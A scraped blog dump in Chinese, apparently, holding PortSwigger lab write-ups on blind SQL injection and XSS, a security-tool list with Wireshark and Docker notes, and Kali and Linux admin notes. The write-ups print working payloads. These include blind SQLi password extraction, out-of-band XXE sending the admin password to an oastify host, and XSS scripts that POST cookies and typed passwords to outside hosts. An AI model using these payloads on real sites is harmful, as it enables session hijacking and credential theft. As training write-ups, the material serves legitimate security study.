'a'='a'–&gt; true；返回 welcome back send to intruder 测试对应位置的密码字符 用到一个函数，SUBSTRING(password,m,n)，password 是字段名，m 是检索的起始位置，n 是数量。SUBSTRING() 函数从字符串中提取一些字符 使用 burp 的 Cluster bomb 爆破，随即登录即可 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- f9126lip1a49h41x6b17 不是很懂，参考了视频(4) SQL Injection - Lab #11 Blind SQL injection with conditional responses - YouTube 具有条件错误的盲 SQL 注入 审题 题目中依旧是给出了数据表 users，字段 username、password，账户名 administrator 本练习使用 Oracle 数据库 应用程序不会根据查询是否返回任何行而做出任何不同的响应 如果 SQL 查询导致错误，则应用程序将返回自定义错误消息。 证明参数是易受攻击的 添加' --&gt; 返回了 500 删除' --&gt; 返回了 200 ' || (select '') ||' --&gt; 返回了 500，说明数据库是 oracle database ' || (select '' from dual) ||' --&gt; 返回了 200 ' || (select '' from abcde) ||' --&gt; 返回了 500，abcde 是编造的不存在的数据表 验证该users表是否存在 '||(select '' from users where rownum = 1)||' --&gt; 200 说明了 users 是表存在的 rownum = 1 代表查询返回一行 MySQL 支持 LIMIT 语句来选取指定的条数数据 Oracle 可以使用 ROWNUM 来选取 || 在 Oracle中，|| 运算符可以将两个或两个以上的字符串连接在一起。string1 || string2 确认管理员administrator字段 '||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||' --&gt; 500，验证条件（when (1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段administrator case when (1=1) then to_char(1/0) else '' end -- 1/0 会导致错误 CASE表达式可以在 SQL 中实现if-then-else型的逻辑 case when 判断语句1 then 返回1 when 判断语句2 then 返回2 …… else 返回n end 密码的长度 '||(select case when length(password)&gt;1 then to_char(1/0) else '' end from users where username='administrator' )||' – 500，条件（条件是密码长度大于 1）为真返回错误 最后确认密码 同样是使用SUBSTR()函数从密码中提取单个字符 '||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||' case when substr(password,1,1)='a' then to_char(1/0) else '' end 输出 http 状态码为 500 的时候，说明找到了密码 administrator th7zlh5neuj8mfp5eu4e 具有时间延迟的盲 SQL 注入 首先确定数据库是哪个 '||(select sleep(10))-- ' --&gt; '||(select pg_sleep(10))-- ' --&gt; 发现需要 10s 的响应时间 select tracking-id from tracking-table where trackingid='pvhzsNX3X3hoWEpS'||(select pg_sleep(10))-- '; 具有时间延迟和信息检索的盲SQL注入 查看是否存在 SQL 注入 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 验证需要 10s 的延迟 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 不延迟 %3b 是为了关闭初始查询，亦即; URL Decode 是否存在用户 administrator x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明存在 administrator 确认密码长度 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明密码长度大于 1，后续直接 send to intruder，最后获知长度为 20 确认密码 依旧是使用SUBSTRING()函数，不再一一述说了 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 带外交互的盲 SQL 注入 目的为利用 SQL 注入漏洞并导致 DNS 查找 用 bp 获得域名，点击左上角的“Burp Collaborator client”， mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com ' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。 带外数据泄露的盲 SQL 注入 依旧是上个题目的套路 ' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT password FROM users WHERE username='administrator')||'.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- 通过 XML 3编码绕过过滤器的 SQL 注入 需要装一个插件 Hackvertor。使用说明Hackvertor-Github","tags":["靶场","SQL注入"],"categories":["网络安全"]},{"title":"portswigger 靶场之 XSS 篇(下)","path":"/2022/06/15/xss-part2/","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 14. 利用跨站点脚本窃取 cookie 在 burp 中使用 Burp Collaborator Client，点击 copy to clipboard。 同时提交博客评论，修改 Burp Collaborator 子域名。 脚本的功能：查看评论的人发出 POST 请求以及 读取 cookie。 &lt;script&gt; fetch('https://qe8bejkmbudhod20kznmpm8v5mbcz1.oastify.com', &#123; method: 'POST', mode: 'no-cors', body:document.cookie &#125;); &lt;/script&gt; // document.cookie --&gt; JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。 回到 Burp Collaborator，单击“Poll now”，以便看到 Http 交互从而找到 Cookie 值进行替换 刷新 Home 主页，在 Burp Repeater 中，Cookie 替换 Send 发送 15. 利用跨站点脚本捕获密码 依旧是在 burp 中使用 Burp Collaborator Client 功能，点击 copy to clipboard。然后评论博客注入脚本（查看评论的话，会发出包含其用户名和密码的 POST 请求）。 回到 Burp Collaborator，单击“Poll now”，找到用户名和密码进行登录即可 &lt;input name=username id=username&gt; &lt;input type=password name=password onchange=&quot;if(this.value.length)fetch('https://6pwdbg28z2wmxtzpbexotcyig9mzao.oastify.com',&#123; method:'POST', mode: 'no-cors', body:username.value+':'+this.value &#125;);&quot;&gt; // onchange 事件 --&gt; 当用户改变input输入框内容时执行一段Javascript代码： administrator:2vlk8eidq808je5v2p8v 16. 利用 XSS 执行 CSRF 先进行登录，在更新电子邮件的位置审查元素，会发现存在 CSRF Token，修改电子邮件获取 CSRF Token 的值 将以下脚本写入博客评论中 &lt;script&gt; var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() &#123; var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&amp;email=test@test.com') &#125;; &lt;/script&gt; 17. 将 XSS 反射到 HTML 上下文中，大多数标签和属性被阻止 插入 XSS &lt;img src=1 onerror=print()&gt; 发现失败了，用 burp 抓包发送到 Burp Intruder 测试哪些标签和属性被阻止，先清除标签Clear §，然后将搜索词的值换为&lt;§§&gt;，在 XSS 备忘单点击Copy tags to clipboard 在 Burp Intruder 的 Payloads 选项卡中，单击“Paste”粘贴。点击“start attack”。看到了 body 和custom tags 响应 200，于是知道了 body 没有过滤 继而将搜索词的值换为&lt;body%20§§=1&gt;，在 XSS 备忘单点击Copy events to clipboard Clear 删除之前的 Payload，paste 粘贴刚复制的，点击“start attack”，发现 onresize 响应 200 // 在 Go to exploit server 的 body 中 &lt;iframe src=&quot;https://0a3600a6032533acc04d05d10149009f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width='100px'&gt; // search=&quot;&gt;&lt;body onresize=print()&gt;&quot; --&gt; search=%22%3E%3Cbody%20onresize=print()%3E&quot; 18. 将 XSS 反射到 HTML 上下文中，除了自定义标签外，所有标签都被阻止 自定义标记 XSS &lt;script&gt; location = 'https://0ac80018037267b7c24cf04d00d300df.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; &lt;/script&gt; // search=&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x'; 19. 允许带有一些 SVG 标记的反射型 XSS 根据标题，测试一下是否可以用 &lt;svg&gt;。搜索框中输入 &lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt; // onBegin() (当元素周期开始时由 onbegin 事件立即触发) 20. 规范链接标签中反映的 XSS https://0ad700e904e18a69c0580c0a00f50068.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) %27accesskey=%27x%27onclick=%27alert(1) --&gt; 'accesskey='x'onclick='alert(1) 21. 将 XSS 反射为带有单引号和反斜杠转义的 JavaScript 字符串 输入&lt;script&gt;alert(1)&lt;/script&gt;发现（图一） 于是直接使用两个弹窗123&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;（图二） （图一） （图二） 22. 将 XSS 反映到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义 输入后的东西会先被 HTML 编码，然后再被 URL 编码 // 弹窗 &lt;script&gt;alert(1)&lt;/script&gt; // Html 编码 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; // Url 编码 %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B // encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。 注意到\\没有进行编码 123\\'+alert(1); // 23. 将 XSS 反映到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义 HTML 解码： http://aaa&amp;apos;+alert(1)+&amp;apos; --&gt; http://aaa'+alert(1)+' &amp;apos; 进行 Html 解码后是 ' http://aaa&amp;apos;+alert(1)+&amp;apos; EXPERT 24. 带有事件处理程序和 href 属性的反射型 XSS 被阻止 模板字符串 - JavaScript | MDN (mozilla.org) $&#123;alert(1)&#125; 25. 在 JavaScript URL 中反映了 XSS 并阻止了一些字符 &lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=&quot;javascript:alert(1)&quot; dur=1s repeatCount=2 /&gt;&lt;text x=20 y=20&gt;Click Me&lt;/text&gt;&lt;/a&gt; 26. 反射 XSS 与 AngularJS 沙箱转义没有字符串 // 问题点 angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) &#123; $scope.query = &#123;&#125;; var key = 'search'; $scope.query[key] = '123'; $scope.value = $parse(key)($scope.query); &#125;); https://0ae600a2036e6b38c13fc17000230068.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 27. 使用 AngularJS 沙箱转义和 CSP 的反射 XSS &lt;script&gt; location='https://0a140035033feb4dc106573801c300c2.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; &lt;/script&gt; 28. 受非常严格的 CSP 保护的反射型 XSS，带有悬挂标记攻击 目的是需要修改被害者的 Email 变成 hacker@evil-user.net 需要取 CSRF Token，然后 CSRF PoC 放入 Token，修改邮箱地址…… 30. 受 CSP 保护的反射型 XSS，绕过 CSP 预期解决方案只能在 Chrome 中使用。 https://0a2a00f0049fa705c2fbc4b600460008.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27 // 搜索search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27 //URL 解码后 &lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem 'unsafe-inline' // unsafe-inline 允许使用内联资源 // script-src-elem CSP 内容安全性策略 CSP: script-src-elem - HTTP | MDN (mozilla.org)","tags":["XSS","靶场"],"categories":["网络安全"]},{"title":"portswigger 靶场之 XSS 篇(上)","path":"/2022/06/11/xss-part1/","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 &lt;script&gt;alert(1)&lt;/script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区 3. 文档中的 DOM XSS.使用 source location.search 编写接收器 在搜索查询功能中有基于 DOM 的跨站点脚本漏洞 在搜索框输入&quot;第三个&quot;，可以发现，输入的词被放到了 JavaScript 代码中的 img 标签的 src 属性中，插入 XSS 代码的话需要先闭合，使用&quot;&gt; `，分别闭合 img 标签和 src 属性 // 在页面输入&quot;第三个&quot; &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; // 插入 XSS 代码第一种方法 &quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt; &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt; &quot;&gt; // 插入 XSS 代码第二种方法 // 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot; 1&quot; onload=&quot;alert(3) &lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; // 源代码 function trackSearch(query) &#123; document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+query+'&quot;&gt;'); &#125; 搜索框输入“第三个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 4. 使用 source location.search in innerHTML sink 中的 DOM XSS。 // 在页面输入&quot;第四个&quot; &lt;span id=&quot;searchMessage&quot;&gt;第四个&lt;/span&gt; // 插入 XSS 代码第一种方法 // 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消 &lt;svg onload=alert(4)&gt; &lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt; // 插入 XSS 代码第二种方法 // 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件 &lt;img src='' onerror=&quot;alert(4)&quot;&gt; 搜索框输入“第四个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 5. 使用 location.search source 在 jQuery 锚点 href 属性接收器中的 DOM XSS Href 不仅可以跳转路径，也可以放入 JS 代码 https://0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) 在 a 标签中 在 a 标签中注入 XSS 代码 6. 在 jQuery 选择器中使用 hashchange 事件的 DOM 型 XSS HTML 内联框架元素 (&lt;iframe&gt;) ，它能够将另一个 HTML 页面嵌入到当前页面中。 https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt; // 官方给的答案： &lt;iframe src=&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot; onload=&quot;this.src+='&lt;img src=x onerror=print(6)&gt;'&quot;&gt;&lt;/iframe&gt; // 源代码 $(window).on('hashchange', function()&#123; var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); &#125;); 直接在网址注入 服务器中修改 body 7. 带尖括号编码的反射型 XSS 尖括号被编码，但是引号没有，在搜索框输入内容后，发现输入的内容展示在了 input 标签的 value 属性中。 onmouseover 属性在鼠标指针移至元素之上时触发，几乎可使用于所有 HTML 元素，也就不限于搜索框input 内容在 input 标签的 value 属性中 输入 \"onmouseover=\"alert(7) 8. 将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中 评论中输入的内容会成为 a 标签 herf 属性的值 输入 123 查看出于什么位置 javascript:alert(8) 9. 将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中 输入ABC 发现是出现在了 script 标签中，尝试闭合弹出 var searchTerms = 'ABC'; document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'&quot;&gt;'); 构造 Payload';alert(9);// 输入 123 查看出于什么位置 ';alert(9);// PRACTITIONER 10. 文档中的 DOM XSS.使用源位置编写接收器.在选择元素内搜索 注入&amp;storeId=&lt;script&gt;alert()&lt;/script&gt; var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('&lt;select name=&quot;storeId&quot;&gt;'); if(store) &#123; document.write('&lt;option selected&gt;'+store+'&lt;/option&gt;'); &#125; for(var i=0;i&lt;stores.length;i++) &#123; if(stores[i] === store) &#123; continue; &#125; document.write('&lt;option&gt;'+stores[i]+'&lt;/option&gt;'); &#125; document.write('&lt;/select&gt;'); 输入 ABC 查看出于什么位置 11. AngularJS 表达式中的 DOM XSS，带有尖括号和双引号HTML 编码 Angular 是一个前端框架，&#123;&#123; ... &#125;&#125; 里头其实就是一个模板表达式，Angular 会对其进行求值并转化为字符串输出。可以放入 JavaScript 脚本 [PayloadsAllTheThings-Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/XSS in Angular.md) 注入：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; Constructor 是一个构造函数 12. 反射式 DOM XSS 13. 存储型 XSS replace()，如果第一个参数是字符串，则仅替换第一个匹配项 function escapeHTML(html) &#123; return html.replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;'); &#125; // 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt; // &amp;lt;代表小于号（&lt;）; &amp;gt;代表大于号（&gt;）","tags":["XSS","靶场"],"categories":["网络安全"]},{"title":"常用网安工具\\命令","path":"/2022/03/11/常用网安工具命令/","content":"工具 工具名称 官网链接 用途描述 常用 BurpSuite portswigger.net 强大的安全测试平台，功能全面。 ✔️（必备） Wireshark wireshark.org 网络协议分析器，可以捕获并交互式分析数据包。 ✔️ Hackerbar hackerbar 浏览器插件，帮助快速构造 HTTP 请求。 御剑 御剑 集成多种渗透测试工具，简化攻击流程。 dirmap dirmap 网站目录扫描工具，寻找隐藏目录和文件。 ✔️ dirsearch dirsearch 一个简单的命令行工具，用于快速扫描目录。 ✔️ sqlmap sqlmap.org sqlmap 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 进行 SQL 注入 ✔️ pdfinfo pdfinfo 用于提取 PDF 文件元数据的命令行工具。 exiftool exiftool.org 用于读取和写入文件的元数据。 XRAY xray.cool 网络安全扫描工具，支持漏洞扫描和信息收集。 OneForAll OneForAll 子域名收集工具，方便进行信息收集。 ✔️ Hydra thc.org 快速的网络密码破解工具，支持多种协议。 HTTPX HTTPX 用于快速探测和验证 HTTP 服务的工具。 ✔️ CS CS 木马工具，提供反向 shell 等功能。 Fiddler telerik.com/fiddler 捕获 HTTP/HTTPS 流量的调试代理。 finger-ub finger 查找用户信息的网络协议工具。 Dig dig DNS 查询工具，用于获取域名的解析信息。 Onforall-ub Onforall OneForAll是一款功能强大的子域收集工具。 ✔️ FofaViewer-ub fofa.so 用于浏览和分析 Fofa 数据的工具。 水泽 水泽 集成化的安全测试工具，功能丰富。 ✔️ EHole-ub EHole 安全测试框架，提供自动化测试功能。 JSFinder JSFinder 查找网站中的 JS 文件。 ✔️ curl curl.se 命令行工具，用于发送 HTTP 请求，灵活便捷。 Postman postman.com API 测试工具，方便发送请求并分析响应。 nmap nmap.org 网络扫描工具，用于发现网络设备和服务。 蚁剑 蚁剑 WebShell 管理工具，方便管理和使用。 phpMyAdmin phpmyadmin.net 用于管理 MySQL 数据库的 Web 应用。 Web Path Brute Web Path Brute Web 路径暴力探测工具，发现隐藏路径。 PyCharm jetbrains.com/pycharm Python 开发环境，功能强大，支持多种插件。 VirusTotal virustotal.com 在线服务，检查文件和 URL 的安全性。 JDK 11 openjdk.java.net Java 开发必备，支持最新应用。 JDK 8 openjdk.java.net 经典版本，很多老项目依然在用。 Docker docker.com 用于创建、部署和管理容器化应用的开源平台。 ##使用（第一次） wireshark 是什么： 有何种称呼： 网络封包分析软件、网络分析工具、网络抓包工具、网络流量分析 使用过程 wireshark 启动后，wireshark 处于抓包状态中 执行需要抓包的操作，在 CMD 中，如ping www.baidu.com 对数据表设置过滤条件： ip.addr == 36.152.44.96 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机IP为 36.152.44.96 的数据包。 Packet List Pane（数据包列表） 数据包列表区中不同的协议使用了不同的\t颜色区分 Packet Details Pane（数据包详细信息） 在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看*协议中的每一个字段*。 Wireshark 过滤器设置 过滤器有两种， 一种是显示过滤器，就是主界面上那个，用来在捕获的记录中找到所需要的记录 一种是捕获过滤器，用来过滤捕获的封包，以免捕获太多的记录。 在Capture -&gt; Capture Filters 中设置 捕获过滤器的菜单栏路径为 Capture --&gt; Capture Filters。用于在抓取数据包前设置。 捕获过滤器 # 过滤器名称：Filter Name capture baidu # 过滤表达式：Filter Expression ip host www.baidu.com 显示过滤器 ip.addr == 36.152.44.96 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机IP为 36.152.44.96 的数据包。 过滤表达式的规则 1. 协议过滤 比如TCP，只显示TCP协议。 2. IP 过滤 比如 ip.src ==192.168.1.102 显示源地址为192.168.1.102， ip.dst==192.168.1.102, 目标地址为192.168.1.102 3. 端口过滤 tcp.port ==80, 端口为80的 tcp.srcport == 80, 只显示TCP协议的愿端口为80的。 4. Http模式过滤 http.request.method==&quot;GET&quot;, 只显示HTTP GET方法的。 常用的过滤表达式 过滤表达式 用途 http 只查看HTTP协议的记录 ip.src ==192.168.1.102 or ip.dst==192.168.1.102 源地址或者目标地址是 192.168.1.102 VirusTotal 在线查毒工具 VirusTotal 的 N 种玩法——从“误报/漏报”聊到“攻击者对它的利用 — 编程随想的博客“ pdfinfo pdfinfo 是一个命令行工具，可以用来获取 PDF 文件的元数据和其他信息，例如文件大小、页面数、作者、标题、创建日期等。它是 Poppler 工具包的一部分，可以在 Linux、macOS 和 Windows 操作系统上使用。pdfinfo 通常被用于批量处理 PDF 文件，例如从文件名中提取元数据、创建文件索引等。 sudo apt install poppler-utils pdfinfo DOCUMENT.pdf BurpSuite 前期配置 搜索关键词：Burpsuite 设置 HTTPS 代理 先导出证书 第一种方法从 bp 中导出证书 第二种方法从浏览器中导出证书，浏览器开了 127.0.0.1:8080 代理的同时访问http://burp下载证书 再导入证书 火狐导入证书 只要求 burp 拦截与靶机之间的数据包，而不要拦截其他网站的数据包，用到了一个chrome的插件——SwitchyOmega。 FoxyProxy BurpSuite 设置代理，ip和端口要和代理工具SwitchyOmega一致 打开 burp，设置代理监听地址，默认为 127.0.0.1:8080 SwitchyOmega——设置浏览器的代理 127.0.0.1:8080 确认拦截开启/关闭 lntercept is on 接着网页操作 错误提示 01-Intercept is off — 无法抓取数据包。 无法捕获本机地址 localhost 和 127.0.0.1 的数据包。 分析： localhost 和 127.0.0.1 是知名的本机地址，通常在各种代理设置中默认被排除，浏览器也可能会有单独的配置来禁止抓取这些本机地址的数据包。 为了抓取本机的流量，建议使用本机的内网地址，例如 192.168.xxx.xxx，或者在 hosts 文件中手动绑定一个域名来替代。 此外，如果网站使用了缓存，流量包可能不会经过 Burp。当浏览器缓存了某些资源时，下次访问时会直接从缓存中获取，而不会重新发送请求，这样就导致 Burp 抓不到请求包。 使用 Ctrl+F5 强制刷新，清空缓存以确保请求能够被捕获。 Docker docker pull下来的命令都默认存在/var/lib/docker/文件夹下 Docker 的常用命令 #系统命令 systemctl start docker #启动docker systemctl stop docker #停止docker systemctl restart docker #重启docker systemctl enable docker #设置docker开机自启 #基本命令 docker version #查看docker版本 docker info #查看docker详细信息 docker --help #查看docker命令 #镜像命令 docker images #查看docker镜像列表 docker images -a #列出本地所有镜像 docker images --digests #显示镜像的摘要信息 docker search redis #从Docker Hub上查找redis镜像 docker pull redis #从Docker Hub上下载redis镜像 docker rmi 373f0984b070 #删除IMAGE ID 为373f0984b070的镜像 #运行命令 #-p 6379:6379\t端口映射：前表示主机部分,后表示容器部分 #-d\t在后台运行容器（不进入终端）并打印容器ID/容器名 #--name myredis表示自定义容器名为myredis docker run -d -p 6379:6379 --name myredis redis:latest #根据镜像创建并运行容器 #容器命令 docker container ls 或 docker ps #查看正在运行的容器 docker container ls -a 或 docker ps -a #列出所有容器 docker container start 容器ID 或 容器名称 #启动容器 docker start 容器ID 或 容器名称 #启动容器 docker container stop 容器ID 或 容器名称 #停止容器 docker stop 容器ID 或 容器名称 #停止容器 docker container rm 容器ID 或 容器名称 #删除容器 docker rm 容器ID 或 容器名称 #删除容器 docker container logs -f 容器ID 或 容器名称 #查看容器日志 docker exec -it name /bin/bash #进入name（容器名/id）中开启交互式的终端，exit退出 docker --help 中文译解 Usage: docker [OPTIONS] COMMAND [arg...] docker daemon [ --help | ... ] docker [ --help | -v | --version ] A self-sufficient runtime for containers. Options: --config=~/.docker Location of client config files #客户端配置文件的位置 -D, --debug=false Enable debug mode #启用Debug调试模式 -H, --host=[] Daemon socket(s) to connect to #守护进程的套接字（Socket）连接 -h, --help=false Print usage #打印使用 -l, --log-level=info Set the logging level #设置日志级别 --tls=false Use TLS; implied by--tlsverify # --tlscacert=~/.docker/ca.pem Trust certs signed only by this CA #信任证书签名CA --tlscert=~/.docker/cert.pem Path to TLS certificate file #TLS证书文件路径 --tlskey=~/.docker/key.pem Path to TLS key file #TLS密钥文件路径 --tlsverify=false Use TLS and verify the remote #使用TLS验证远程 -v, --version=false Print version information and quit #打印版本信息并退出 Commands: attach Attach to a running container #当前shell下attach连接指定运行镜像 build Build an image from a Dockerfile #通过Dockerfile定制镜像 commit Create a new image from a container's changes #提交当前容器为新的镜像 cp Copy files/folders from a container to a HOSTDIR or to STDOUT #从容器中拷贝指定文件或者目录到宿主机中 create Create a new container #创建一个新的容器，同run 但不启动容器 diff Inspect changes on a container's filesystem #查看docker容器变化 events Get real time events from the server#从docker服务获取容器实时事件 exec Run a command in a running container#在已存在的容器上运行命令 export Export a container's filesystem as a tar archive #导出容器的内容流作为一个tar归档文件(对应import) history Show the history of an image #展示一个镜像形成历史 images List images #列出系统当前镜像 import Import the contents from a tarball to create a filesystem image #从tar包中的内容创建一个新的文件系统映像(对应export) info Display system-wide information #显示系统相关信息 inspect Return low-level information on a container or image #查看容器详细信息 kill Kill a running container #kill指定docker容器 load Load an image from a tar archive or STDIN #从一个tar包中加载一个镜像(对应save) login Register or log in to a Docker registry#注册或者登陆一个docker源服务器 logout Log out from a Docker registry #从当前Docker registry退出 logs Fetch the logs of a container #输出当前容器日志信息 pause Pause all processes within a container#暂停容器 port List port mappings or a specific mapping for the CONTAINER #查看映射端口对应的容器内部源端口 ps List containers #列出容器列表 pull Pull an image or a repository from a registry #从docker镜像源服务器拉取指定镜像或者库镜像 push Push an image or a repository to a registry #推送指定镜像或者库镜像至docker源服务器 rename Rename a container #重命名容器 restart Restart a running container #重启运行的容器 rm Remove one or more containers #移除一个或者多个容器 rmi Remove one or more images #移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除) run Run a command in a new container #创建一个新的容器并运行一个命令 save Save an image(s) to a tar archive#保存一个镜像为一个tar包(对应load) search Search the Docker Hub for images #在docker hub中搜索镜像 start Start one or more stopped containers#启动容器 stats Display a live stream of container(s) resource usage statistics #统计容器使用资源 stop Stop a running container #停止容器 tag Tag an image into a repository #给源中镜像打标签 top Display the running processes of a container #查看容器中运行的进程信息 unpause Unpause all processes within a container #取消暂停容器 version Show the Docker version information#查看容器版本号 wait Block until a container stops, then print its exit code #截取容器停止时的退出状态值 Docker 图片 未完待续……","categories":["网络安全"]},{"title":"kali linux 美化","path":"/2021/08/09/kali linux 美化/","content":"kali linux [kali linux]-美化_kali美化_Mr.木Mu的博客-CSDN博客 oh-my-zsh,让你的终端从未这么爽过 - 简书 (jianshu.com) Themes · ohmyzsh/ohmyzsh Wiki (github.com) oh-my-zsh // 先更新一下 apt-get update apt-get upgrade // 安装 zsh，查看当前系统使用的 shell echo $SHELL // 查看系统是否安装了 zsh cat /etc/shells // 用 yum 安装 zsh yum -y install zsh // 切换 shell 为 zsh chsh -s /bin/zsh // 修改主题 vim ~/.zshrc // 将 ZSH_THEME 改成 agnoster // 主题列表——https://github.com/ohmyzsh/ohmyzsh/wiki/themes ZSH_THEME=&quot;agnoster&quot; // 重启后，查看当前shell source ~/.zshrc // 默认主题 ZSH_THEME=&quot;robbyrussell&quot; // 进入 vim 后 i Esc :wq 自动补齐插件 $ wget http://mimosa-pudica.net/src/incr-0.2.zsh 编辑器 sublime（notepad++只有win）","tags":["kali","linux"]},{"title":"挂载扩容 Linux 服务器","path":"/2021/06/09/挂载扩容linux服务器/","content":"需求 Linux 服务器硬盘从 300G 扩容到 500G /etc/fstab 持久性挂载 一、确认当前磁盘状态 使用 df -h 命令确认目前的空间状态。 [root@hostname ops]# df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 7.8G 0 7.8G 0% /dev tmpfs 7.8G 4.0K 7.8G 1% /dev/shm tmpfs 7.8G 17M 7.8G 1% /run tmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup /dev/vda1 300G 1.4G 299G 1% / tmpfs 1.6G 0 1.6G 0% /run/user/201 二、确认新磁盘 使用 lsblk 命令来确认新磁盘是否被正确识别——发现新磁盘被正常识别到。 [root@hostname ops]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT vda 253:0 0 300G 0 disk └─vda1 253:1 0 300G 0 part / vdb 253:16 0 200G 0 disk 可以发现 /dev/vdb 